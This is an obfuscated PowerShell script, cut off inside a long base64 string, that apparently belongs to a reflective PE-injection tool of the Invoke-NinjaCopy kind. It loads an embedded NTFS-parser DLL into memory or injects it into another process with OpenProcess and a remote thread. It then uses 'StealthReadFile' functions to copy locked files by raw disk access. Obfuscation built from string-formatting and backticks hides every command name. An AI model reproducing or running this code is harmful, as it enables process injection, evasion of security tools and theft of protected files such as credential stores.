				${iMpo`R`TDescRIPt`oR} =  (&("{0}{1}" -f 'V','AriablE') ('15y4H'+'S'))."V`ALuE"::"pTrT`OSt`RuCT`Ure"(${im`PortdEsC`R`ipt`Orp`Tr}, [Type]${W`iN`32t`YpEs}."IM`Age_IMpor`T_d`eScR`IpTor")
				
				
				if (${IM`p`orT`De`scRiPTOr}."CHAR`ActEr`Ist`Ics" -eq 0 `
						-and ${iMPOR`Td`e`sC`RI`ptor}."FIRstt`Hu`Nk" -eq 0 `
						-and ${Imp`Or`T`D`eScRi`pTor}."fOrwaR`DeRc`HaiN" -eq 0 `
						-and ${i`MP`orTDEs`c`RIPTor}."NA`mE" -eq 0 `
						-and ${im`p`oRTdescRi`PtOR}."TIMed`AT`E`s`Tamp" -eq 0)
				{
					&("{2}{1}{3}{0}"-f'ose','t','Wri','e-Verb') ("{6}{8}{13}{3}{5}{2}{11}{4}{0}{9}{10}{1}{7}{12}" -f 'e',' b','rari','ing th','n','e lib','Don','y the P','e unlo','e','ded','es ','E','ad')
					break
				}

				${Impo`RT`Dl`lpATh} =  ( &("{1}{0}" -f 'TeM','I') ('vaRiabLE:'+'15'+'y4'+'HS')  )."VaL`Ue"::("{0}{1}{2}"-f'PtrToStri','ng','Ansi').Invoke((&("{0}{6}{5}{1}{2}{3}{4}"-f'Ad','ignedI','nt','AsUn','signed','S','d-') ([Int64]${pe`in`Fo}."P`EHaN`DLE") ([Int64]${im`pOrTD`e`SCRI`pTor}."N`AmE")))
				${i`MPoR`Td`L`lhaNDLE} = ${WIN32`FUnCT`I`onS}."GetmodU`Le`HandlE"."in`VOke"(${I`M`PO`RTDLlp`Ath})

				if (${IM`Por`TD`lLhan`Dle} -eq ${n`ULl})
				{
					&("{0}{3}{2}{4}{1}" -f 'Write-W','ng','rn','a','i') ('Erro'+'r '+'getti'+'ng'+' '+'D'+'LL '+'handl'+'e '+'i'+'n '+'M'+'emoryFre'+'eLib'+'rary, '+'D'+'LLNa'+'me: '+"$ImportDllPath. "+'Cont'+'inui'+'ng '+'a'+'nyways') -WarningAction ("{1}{2}{0}"-f 'e','Con','tinu')
				}
				
				${s`UccE`ss} = ${WI`N32f`UnC`T`iONS}."fREE`l`IbRA`RY"."i`N`Voke"(${IMp`ORTdllh`AnD`lE})
				if (${s`Uc`cESs} -eq ${f`A`LsE})
				{
					&("{3}{0}{2}{1}"-f'rite-','g','Warnin','W') ('Un'+'abl'+'e '+'t'+'o '+'fr'+'ee '+'libra'+'ry'+': '+"$ImportDllPath. "+'C'+'ontinu'+'i'+'ng '+'a'+'nyways.') -WarningAction ("{0}{1}" -f'Con','tinue')
				}
				
				${im`p`ORT`des`cRIptOrp`TR} = &("{3}{1}{6}{5}{0}{4}{2}"-f 'i','ignedInt','ed','Add-S','gn','Uns','As') (${im`pORTd`EscR`ipTOr`PTr}) (  $15y4hS::"S`IZeOF"([Type]${WIn`3`2TYP`es}."IMaG`e_I`m`PORT_DE`SC`RiPtOr"))
			}
		}
		
		
		&("{1}{2}{0}" -f 'bose','Wr','ite-Ver') ("{2}{8}{1}{4}{6}{5}{3}{0}{7}"-f'ng u','ai','Calli','it is bei','n ','ows ','so the DLL kn','nloaded','ng dllm')
		${DL`L`Ma`INPtr} = &("{3}{0}{2}{4}{1}" -f 'igne','gned','dIntAsUns','Add-S','i') (${p`eIn`Fo}."P`Eh`ANdle") (${PEI`NfO}."iMaG`E_N`T_`heAD`eRS"."optI`ON`A`L`hEADEr"."A`D`DrEssOF`EnTRyPo`i`NT")
		${Dll`MaindE`Lega`Te} = &("{0}{2}{4}{3}{1}"-f 'Get-','e','De','yp','legateT') @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		${D`LLMA`iN} =   (  &("{0}{1}{2}"-f 'G','Et','-VArIABLE')  ("15"+"Y4Hs") )."vA`luE"::("{5}{4}{1}{2}{0}{3}" -f'i','elegateForFun','ctionPo','nter','tD','Ge').Invoke(${d`lLMaInp`TR}, ${dLlM`AiNDE`L`EgAte})
		
		${D`LLMA`In}."inV`oke"(${P`EiN`FO}."P`EhaN`dle", 0,   $1i2L::"ZE`Ro") | &("{0}{1}"-f'Out','-Null')
		
		
		${s`Uc`cEss} = ${w`I`N32FUn`cTiO`Ns}."VIrTU`AlF`REE"."I`N`Voke"(${PEH`AnD`le}, [UInt64]0, ${wIN3`2c`oNSt`ANTs}."mE`m`_REL`eASe")
		if (${sUc`Ce`sS} -eq ${FAL`SE})
		{
			&("{1}{2}{0}"-f'arning','Writ','e-W') ((("{10}{2}{5}{8}{3}{6}{0}{9}{12}{1}{7}{4}{13}{14}{11}" -f ' ',' m','nable','ee o',' Co',' to call Vi','n','emory.','rtualFr','the PED','U','.','lps','ntinuin','g anyways'))  -crepLACE  'Dlp',[cHAr]39) -WarningAction ("{1}{0}" -f 'nue','Conti')
		}
	}


	Function m`AiN
	{
		${WiN3`2fU`N`ctIons} = &("{1}{5}{0}{4}{2}{3}" -f'Wi','G','Funct','ions','n32','et-')
		${WiN32t`Y`pES} = &("{0}{1}{2}{3}"-f'Ge','t-Win32Typ','e','s')
		${W`IN3`2CO`Ns`TaNTS} =  &("{3}{0}{1}{2}{4}" -f 'in32C','onsta','nt','Get-W','s')
		
		${rEmOte`prOChan`d`lE} =   $1i2L::"zE`RO"
		
		${Pr`O`Cid} = ${nu`lL}
		${eXEA`R`gS} = ${n`ULL}
		${P`Rocna`ME} = ${NU`LL}

        
        if (  (&("{1}{0}{2}"-f 'i','get-','Tem')  ('VA'+'ri'+'Able:1'+'5y'+'4Hs')  )."v`AlUe"::"siz`e`OF"([Type][IntPtr]) -eq 8)
        {
            [Byte[]]${PEbYT`es} = [Byte[]]  ( &("{0}{1}"-f 'gC','i') VaRIAbLE:v3m  )."val`UE"::("{2}{1}{0}{3}{4}" -f'6','romBase','F','4St','ring').Invoke(${PeB`yt`eS64})
        }
        else
        {
            [Byte[]]${PE`B`ytes} = [Byte[]]  ( &("{2}{0}{1}" -f'a','riabLE','v') ('v'+'3m') -Valu )::("{2}{4}{1}{3}{0}" -f'ring','se64','Fro','St','mBa').Invoke(${pE`B`yt`es32})
        }
        ${Peb`YT`Es}[0] = 0
        ${P`EByt`es}[1] = 0
		
		
		if ((${PrO`cID} -ne ${nu`Ll}) -and (${P`RoCId} -ne 0) -and (${pR`o`CNAMe} -ne ${Nu`ll}) -and (${p`R`oCnaMe} -ne ""))
		{
			Throw ((("{8}{3}{2}{0}{11}{6}{12}{1}{4}{9}{7}{5}{10}"-f 'y ','e, ','l','anwiSt supp','choos','r the ',' ',' o','C','e one','other','a ProcId','and ProcNam'))  -crEPlaCe 'wiS',[cHAr]39)
		}
		elseif (${P`ROCNa`ME} -ne ${n`ULL} -and ${PRo`c`NaME} -ne "")
		{
			${p`Ro`CessES} = @(&("{2}{0}{1}" -f 'ro','cess','Get-P') -Name ${pROc`N`AMe} -ErrorAction ("{1}{4}{2}{3}{0}" -f 'ue','S','ti','n','ilentlyCon'))
			if (${PRocE`sS`eS}."CO`UNT" -eq 0)
			{
				Throw (('Can'+'{0'+'}t'+' ')  -F[CHaR]39+'fi'+'nd '+'proce'+'ss '+"$ProcName")
			}
			elseif (${PrO`C`eSs`ES}."cou`Nt" -gt 1)
			{
				${pR`OC`InFO} = &("{2}{1}{0}"-f 's','roces','Get-P') | &("{0}{1}"-f 'wher','e') { ${_}."nA`ME" -eq ${pR`oCn`Ame} } | &("{0}{1}{2}" -f'S','elect-Objec','t') ("{2}{0}{1}{3}" -f 'roce','s','P','sName'), ('Id'), ("{1}{0}"-f 'essionId','S')
				&("{1}{2}{0}" -f 't','Write','-Outpu') ${pr`oCIn`Fo}
				Throw ('More'+' '+'tha'+'n '+'one'+' '+'insta'+'nce'+' '+'o'+'f '+"$ProcName "+'found'+', '+'pleas'+'e'+' '+'sp'+'ecify '+'th'+'e '+'pr'+'oce'+'ss '+'I'+'D '+'t'+'o '+'inje'+'ct'+' '+'in'+' '+'to'+'.')
			}
			else
			{
				${PR`o`CID} = ${Pro`CesS`es}[0]."I`d"
			}
		}
		
		
		





		
		if ((${P`ROCId} -ne ${n`UlL}) -and (${p`RO`CiD} -ne 0))
		{
			${rem`oTEP`Ro`CHAndLE} = ${WIN3`2F`UN`C`TiOns}."O`P`eNPROCE`SS"."I`N`VoKE"(0x001F0FFF, ${fa`LsE}, ${P`R`ocID})
			if (${R`eMO`TePrOCh`AN`dle} -eq   $1I2L::"ZE`Ro")
			{
				Throw ((('C'+'o'+'uldnvmg'+'t'+' ') -cREPLaCE 'vmg',[ChAr]39)+'o'+'bt'+'ain '+'t'+'he '+'han'+'dl'+'e '+'f'+'or '+'p'+'rocess'+' '+'I'+'D: '+"$ProcId")
			}
			
			&("{2}{1}{3}{0}" -f'Verbose','rite','W','-') ("{12}{8}{6}{10}{7}{4}{1}{13}{0}{2}{9}{11}{3}{14}{5}"-f 'ss to','ot',' inj','in','em','to','the h','e r',' ','ect','andle for th',' ','Got','e proce',' ')
		}
		

		
		&("{1}{2}{3}{0}"-f'se','Wr','ite-Ver','bo') ("{1}{9}{5}{4}{7}{8}{0}{3}{2}{6}" -f 'a','Cal','ibr','dL','-Mem','Invoke','ary','or','yLo','ling ')
		${p`EhAnd`le} =   (  &('gi') ("VARIA"+"bLE:1"+"i"+"2l"))."va`LuE"::"Ze`Ro"
		if (${RemOt`EP`ROcHAn`DLE} -eq   (&("{1}{2}{0}" -f 'TEm','G','eT-i') ("VAr"+"IABle"+":"+"1I2"+"L"))."Va`Lue"::"z`erO")
		{
			${Pe`LOaDEd`In`Fo} = &("{2}{5}{3}{0}{4}{1}" -f 'dLibra','y','I','ryLoa','r','nvoke-Memo') -PEBytes ${Pe`BYTes} -ExeArgs ${eXE`ArGs}
		}
		else
		{
			${PEl`Oa`deDinFo} = &("{4}{2}{0}{5}{1}{3}"-f 'Lo','br','mory','ary','Invoke-Me','adLi') -PEBytes ${p`eB`yTeS} -ExeArgs ${ExE`ARGS} -RemoteProcHandle ${rEM`Ote`PRo`ChAn`DLe}
		}
		if (${p`eLoA`dE`DINFO} -eq   (  &('GI')  VARIaBLE:1I2l)."V`ALUe"::"zE`RO")
		{
			Throw ("{0}{11}{1}{8}{5}{6}{4}{3}{7}{9}{2}{10}"-f'Unable to ','oad','is N','andle return','h',',',' ','ed',' PE',' ','ULL','l')
		}
		
		${PehA`N`DLE} = ${p`E`LoAdE`DiNFO}[0]
		${rEM`Ot`ePeHan`dle} = ${p`Elo`A`DEdinFo}[1] 
		
		
		
		${Pe`i`NFO} = &("{2}{4}{0}{1}{3}" -f '-PE','Detai','G','ledInfo','et') -PEHandle ${pEH`AN`D`Le} -Win32Types ${wIn`3`2ty`pes} -Win32Constants ${WiN32co`N`StaNTs}
		if ((${P`EIN`Fo}."Fi`l`EtypE" -ieq "DLL") -and (${R`EmoT`EPRo`cHaN`dLe} -eq  $1I2L::"zE`RO"))
		{
			
			
			
			
            &("{2}{0}{1}"-f 'rite-','Verbose','W') ("{3}{6}{4}{7}{8}{5}{1}{2}{0}"-f'n DLL','lthReadFile ','i','C','ll','g Stea','a','i','n')

            
		    [IntPtr]${sTEA`lThre`AdFiL`Ead`Dr} = &("{3}{1}{2}{0}{4}"-f'ocA','et-MemoryP','r','G','ddress') -PEHandle ${P`E`hAndlE} -FunctionName ("{2}{0}{1}{3}"-f 'h','ReadFi','Stealt','le')
		    if (${ST`eaLTH`REaDfil`EAdDR} -eq   $1i2l::"z`ERO")
		    {
			    Throw ((("{5}{3}{4}{1}{7}{0}{6}{2}{8}"-f 'teal','0}t find addr','Fi','ldn','{','Cou','thRead','ess of S','le.'))  -F[Char]39)
		    }
		    ${STeALTH`RE`ADfiLE`De`LEGATe} = &("{1}{2}{3}{0}"-f 'e','Get-DelegateT','y','p') @([IntPtr], [IntPtr], [UInt32], [UInt64],  ( &("{0}{1}" -f'DI','R')  ('VARiaBL'+'e:m'+'28R76')  )."va`LUe".("{0}{1}{2}"-f 'MakeB','yRe','fType').Invoke(),   ( &("{0}{2}{1}" -f 'chI','iTem','Ld') ("vari"+"able:"+"3"+"5Gm2O") )."VA`lUe".("{3}{1}{4}{0}{2}"-f 'Ty','yR','pe','MakeB','ef').Invoke()) ([UInt32])
			${ST`e`AlTHReA`dfIle} =   (&("{0}{1}{3}{2}" -f 'gEt','-','em','cHIldit')  ('VaRiaBl'+'E:15'+'Y4h'+'s')  )."v`AlUE"::("{4}{3}{0}{1}{5}{2}"-f'ion','Poi','ter','ateForFunct','GetDeleg','n').Invoke(${sTEaL`ThR`eadF`iLEa`dDR}, ${sTEaLT`h`REa`D`F`Il`EdELeGATe})

			[IntPtr]${s`TeAltHc`L`O`s`efILeAddR} = &("{0}{3}{2}{1}{4}"-f'Get','yProcAddr','or','-Mem','ess') -PEHandle ${pEHa`NdlE} -FunctionName ("{2}{3}{1}{0}" -f 'ile','F','StealthCl','ose')
		    if (${STE`ALtH`C`LO`seFi`Le`ADdr} -eq  $1i2L::"z`ERO")
		    {
			    Throw ((("{7}{4}{11}{1}{8}{5}{10}{9}{13}{6}{2}{0}{12}{3}"-f 'CloseF','n','th','le.','uldn{0}t ','dress','eal','Co','d ad','S',' of ','fi','i','t'))-f [char]39)
		    }
		    ${StEALT`hclose`FilEDEle`GA`Te} = &("{3}{4}{1}{0}{2}"-f'gateTy','Dele','pe','Get','-') @([IntPtr]) ([Void])
			${ST`EAlT`HcloS`E`FilE} =  ( &("{0}{2}{1}"-f'gE','ARiABlE','t-v')  ('15Y'+'4Hs') -VaLueONl  )::("{2}{3}{5}{4}{1}{0}" -f 'ter','n','G','et','elegateForFunctionPoi','D').Invoke(${SteALThCL`os`efil`ead`dR}, ${STE`A`ltHCLO`SEFIledElEG`AtE})

			[IntPtr]${S`TE`ALThOP`en`FIlEa`DdR} = &("{2}{1}{0}{3}{4}"-f'moryPr','e','Get-M','ocAd','dress') -PEHandle ${PE`hAN`dLE} -FunctionName ("{2}{0}{3}{1}"-f'e','OpenFile','St','alth')
		    if (${St`eAL`Th`OpEn`FIlE`ADdr} -eq  $1I2l::"Ze`Ro")
		    {
			    Throw ((("{5}{3}{4}{2}{1}{7}{6}{0}" -f '.','s of St','dres','ind',' ad','CouldnTkdt f','File','ealthOpen'))."r`EPL`ACE"('Tkd',[STrInG][chAr]39))
		    }
			
		    ${StEAlthOp`enF`IL`EDel`E`G`ATe} = &("{2}{1}{3}{4}{0}"-f'e','t-D','Ge','elegate','Typ') @([String]) ([IntPtr])
			${sTe`Al`ThOpE`Nfi`le} =   (&("{0}{1}" -f 'ITe','M') VAriaBLe:15Y4Hs )."vaL`UE"::("{0}{1}{8}{2}{6}{7}{5}{4}{3}" -f'GetDele','gat','o','er','ionPoint','t','rFu','nc','eF').Invoke(${stEALth`open`FIL`EAdDR}, ${steAlT`HOPe`NFi`lEdEl`eGaTE})

			
			if (${rE`moTEDest`i`NATIon} -imatch "^\s*$")
			{
				${REmo`TEDesTina`T`iON} = ${n`ULl}
			}
			
			
			[IntPtr]${Fi`Le`HAnd`le} = ${s`TEaL`Th`OpENFILE}."IN`Vo`ke"(${pA`Th})
			if (${FILEh`An`D`le} -eq  (&("{1}{0}{3}{2}" -f '-vaRiA','Get','Le','B')  ("1I"+"2L") )."vA`LUE"::"ze`RO")
			{
				Throw ((("{8}{0}{6}{1}{7}{2}{3}{4}{9}{5}" -f 'Fn','g','a handle ','for ','th','ile','Nt ','et ','Couldn','e f'))."RE`Pla`cE"(([ChAr]70+[ChAr]110+[ChAr]78),[STRiNG][ChAr]39))
			}
			
            ${StopL`O`Op} = ${FaL`sE}
			do
			{
				[IntPtr]${buFf`Er`Ptr} =   (&("{1}{0}" -f 'EM','It')  varIABle:15y4hs )."va`Lue"::("{0}{1}{2}" -f'A','llocHGlob','al').Invoke(${bu`FfeRsI`ze})
				[UInt32]${BYT`E`Sre`AD} = 0
				[UInt64]${B`yTesl`efT} = 0

			    [UInt32]${r`et`VAl} = ${s`TEA`LtH`REad`FiLE}."i`Nvoke"(${FI`Le`HaND`lE}, ${BUf`F`ErPTR}, ${buffE`RS`IzE}, ${F`ILeoF`FSET}, [Ref]${by`T`Es`ReAD}, [Ref]${byt`eS`lEFT})

				if (${reT`VaL} -ne 0)
				{
					&("{2}{0}{1}"-f 'rro','r','Write-E') ('Err'+'or '+'read'+'ing '+'fil'+'e. '+'Re'+'t'+'urn '+'co'+'d'+'e: '+"$RetVal") -ErrorAction ("{0}{1}" -f'S','top')
				}
				
				
				if (${REmoTeDES`T`i`NAti`on} -eq ${N`Ull})
				{
					${STop`LOop} = ${tr`Ue}
				}
				
				[Byte[]]${BytE`B`UffEr} = &("{1}{2}{0}" -f'ect','N','ew-Obj') ("{1}{0}"-f'te[]','By') ${bytESr`e`AD}
				  $15y4hS::("{0}{1}"-f'Co','py').Invoke(${BUFf`Erp`TR}, ${bYteb`Uf`F`eR}, 0, ${byT`e`srEad})
                 $15Y4Hs::("{0}{3}{1}{2}" -f 'Fr','e','HGlobal','e').Invoke(${Buf`Fer`PtR})
				
				if (${re`moTEde`s`TIna`TiON} -ne ${Nu`ll})
				{
					${fIl`estR`eaM} = &("{2}{0}{1}" -f 'Ob','ject','New-') ("{2}{1}{3}{0}{4}"-f'IO.Fi','em','Syst','.','leStream') ${remO`TeDesTI`NAT`I`oN},(  ( &("{2}{0}{1}" -f 'ARIAb','lE','V')  H2pd  )."va`Lue"::"Ap`Pe`ND")
					${f`ileS`TReam}.("{1}{0}"-f'ek','Se').Invoke(0,   $S2C9X::"e`Nd") | &("{0}{1}"-f'Out-Nul','l')
					${Fi`Le`stR`EAm}.("{0}{1}"-f'Writ','e').Invoke(${B`YTeBuF`F`Er}, 0, ${bYtesr`e`AD}) | &("{2}{0}{1}"-f'ut','-Null','O')
					${F`iles`TREam}.("{0}{1}" -f 'Fl','ush').Invoke() | &("{0}{1}" -f'Ou','t-Null')
					${FIL`esTR`Eam}.("{0}{2}{1}"-f'Di','e','spos').Invoke() | &("{1}{0}" -f'll','Out-Nu')
					${f`Il`E`sTREam} = ${n`Ull}
				}
				
				[UInt64]${fIL`eo`F`Fset} += ${by`TESr`ead}
				
				&("{2}{4}{3}{0}{1}"-f'Verb','ose','W','te-','ri') ('Read'+' '+"$BytesRead "+'bytes'+'. '+"$BytesLeft "+'b'+'ytes'+' '+'re'+'mai'+'ning.')
			} while ((${bYT`e`slE`Ft} -gt 0) -and (${STopL`o`OP} -eq ${FA`LSE}))

			
			${sTEAl`Th`C`losE`FIlE}."invO`Ke"(${Fi`leha`N`dle}) | &("{0}{1}"-f'Ou','t-Null')


			
			
			
			
		}
		
		elseif ((${PE`i`Nfo}."fI`LET`ype" -ieq "DLL") -and (${R`EmO`TEPROC`HAn`DLe} -ne   ( &("{1}{0}" -f 'teM','I')  ("VArIa"+"b"+"l"+"E:1i2L"))."vA`LUE"::"ze`RO"))
		{
			${V`oidfUNcAD`dr} = &("{2}{4}{1}{0}{5}{3}{6}" -f 'oryPr','em','Get-','dd','M','ocA','ress') -PEHandle ${peHAND`Le} -FunctionName ("{0}{1}"-f'VoidF','unc')
			if ((${vo`Id`FUncA`dDr} -eq ${n`ULL}) -or (${vOiD`FuNcA`DDR} -eq   (&("{0}{2}{1}"-f'chiLDi','m','te')  variaBLe:1i2L  )."va`lUe"::"z`ERo"))
			{
				Throw ((("{2}{7}{6}{4}{3}{8}{9}{5}{1}{0}"-f'in the DLL',' be found ','Vo','n','u','t','dF','i','c ','couldn{0}')) -f  [Char]39)
			}
			
			${v`oi`DFUnCA`DDr} = &("{4}{3}{2}{5}{0}{6}{1}" -f'In','gned','e','Sign','Sub-','d','tAsUnsi') ${voi`d`FUn`C`Addr} ${P`EH`ANDlE}
			${VOID`FuNCA`Ddr} = &("{2}{5}{4}{1}{3}{0}" -f'ed','gnedIntAsUnsi','Add-','gn','i','S') ${vOID`FunCa`d`dr} ${rem`OT`EpeHanD`LE}
			
			
			${rT`hRe`ADh`AN`dLE} = &("{5}{3}{2}{6}{0}{4}{1}{7}"-f'teR','mot','oke-','v','e','In','Crea','eThread') -ProcessHandle ${remo`TEpR`ocH`ANdLe} -StartAddress ${vO`id`FUNCA`ddr} -Win32Functions ${WIN32f`UncT`ions}
		}
		
		
		if (${RemOteP`R`OCH`An`Dle} -eq   ( &("{1}{0}"-f'r','dI')  ('vaRIab'+'l'+'e'+':1i2l'))."VAL`UE"::"ze`Ro")
		{
			&("{0}{1}{2}{3}{4}"-f'Invoke-','MemoryF','reeL','ibr','ary') -PEHandle ${p`EHA`NdlE}
		}
		else
		{
			
			${suC`C`eSs} = ${win32f`Un`cT`IONs}."vIRT`UalFR`eE"."InV`OKe"(${peHA`N`DLe}, [UInt64]0, ${W`in32con`ST`An`TS}."Me`M`_releASe")
			if (${s`UcC`ESS} -eq ${Fal`SE})
			{
				&("{2}{1}{0}{3}" -f'a','rite-W','W','rning') ((("{7}{11}{6}{4}{13}{12}{3}{14}{2}{10}{9}{5}{1}{8}{0}" -f'nyways.','g','mory. Co','ls','e o','n','ualFre','Unable to call',' a','inui','nt',' Virt','ru','n the PE',' me'))."REp`l`ACe"(([ChAR]114+[ChAR]117+[ChAR]108),[sTrInG][ChAR]39)) -WarningAction ("{1}{0}{2}"-f 'ti','Con','nue')
			}
		}
		
		&("{2}{0}{1}{3}" -f'ite','-V','Wr','erbose') ("{0}{1}" -f 'Do','ne!')

        
        if (${rEmoTeDeS`Ti`N`A`TIoN} -eq ${NU`Ll})
        {
            ${o`Bj} = &("{0}{2}{1}" -f 'N','-Object','ew') ("{0}{2}{1}"-f'PSO','ct','bje')
            ${o`Bj} | &("{1}{3}{2}{0}"-f 'r','Add-','e','Memb') -MemberType ("{1}{2}{0}" -f 'y','Not','ePropert') -Name ("{0}{1}"-f 'Byte','s') -Value ${BYte`Bu`Ff`er}
            ${O`Bj} | &("{1}{0}{2}" -f 'M','Add-','ember') -MemberType ("{2}{0}{1}"-f'teProp','erty','No') -Name ("{1}{0}"-f 't','BytesLef') -Value ${by`Te`SL`eft}
            ${o`BJ} | &("{3}{2}{1}{0}"-f 'r','-Membe','d','Ad') -MemberType ("{1}{2}{0}"-f'erty','NotePr','op') -Name ("{0}{1}" -f 'B','ytesRead') -Value ${bytES`R`EaD}
            return ${o`Bj}
        }
        else
        {
            return ${N`ULl}
        }
	}

	&("{1}{0}" -f'in','Ma')
}


Function m`Ain
{
	if ((${pS`cm`D`LeT}."my`I`NvoC`ATiON"."BO`UN`dP`Ara`mEterS"[("{1}{0}" -f 'ug','Deb')] -ne ${n`ULL}) -and ${PSCM`dL`et}."m`YI`NvOcA`TIOn"."BO`UnDpAr`A`MeteRs"[("{1}{0}" -f'ebug','D')]."ISpr`E`seNt")
	{
		${d`Ebug`preFE`ReNCE}  = ("{2}{0}{1}"-f'u','e','Contin')
	}
	
	&("{4}{3}{2}{0}{1}" -f 'o','se','rb','ite-Ve','Wr') ('Po'+'werS'+'hell '+'P'+'roces'+'sID: '+"$PID")

	[String]${PE`B`YtE`S64} = ("{111}{73}{84}{88}{64}{46}{41}{15}{97}{30}{36}{18}{29}{99}{92}{82}{120}{91}{121}{39}{38}{59}{122}{126}{76}{40}{114}{124}{96}{24}{108}{19}{62}{102}{47}{116}{2}{86}{110}{56}{20}{33}{61}{83}{31}{112}{60}{21}{12}{51}{113}{75}{54}{131}{101}{5}{1}{72}{45}{100}{3}{89}{106}{8}{95}{11}{27}{125}{26}{23}{14}{105}{50}{71}{107}{74}{43}{66}{53}{79}{77}{80}{44}{98}{123}{68}{104}{22}{16}{130}{119}{52}{67}{32}{65}{117}{9}{48}{17}{94}{85}{57}{4}{109}{7}{34}{10}{78}{0}{81}{128}{42}{49}{115}{25}{55}{28}{118}{133}{103}{93}{129}{69}{35}{13}{90}{70}{132}{63}{58}{37}{87}{6}{127}" -f'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